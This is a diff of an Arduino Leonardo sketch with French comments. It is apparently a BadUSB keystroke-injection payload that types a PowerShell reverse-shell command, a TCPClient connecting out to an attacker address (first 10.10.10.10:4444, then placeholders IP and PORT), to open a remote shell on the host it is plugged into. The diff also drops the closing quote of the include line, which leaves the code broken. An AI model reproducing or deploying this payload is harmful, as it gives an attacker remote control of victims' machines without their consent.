@@ -1,6 +1,7 @@
 //programme permettant d'ouvrir un client shell
+//exporter le programme sur une clé usb compatible avec la faille Bad Usb (microcontroleur arduino leonardo)
 
-#include "KeyboardAzertyFr.h"
+#include "KeyboardAzertyFr.h
 
 void setup() {
   
@@ -20,7 +21,7 @@ delay(1500);
 
 
 
-KeyboardAzertyFr.print("$client = New-Object  System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();");
+KeyboardAzertyFr.print("$client = New-Object  System.Net.Sockets.TCPClient(\"IP\",PORT);$stream = $client.GetStream();");
 delay(500);
 KeyboardAzertyFr.press(KEY_LEFT_CTRL);
 KeyboardAzertyFr.press(KEY_LEFT_ALT);
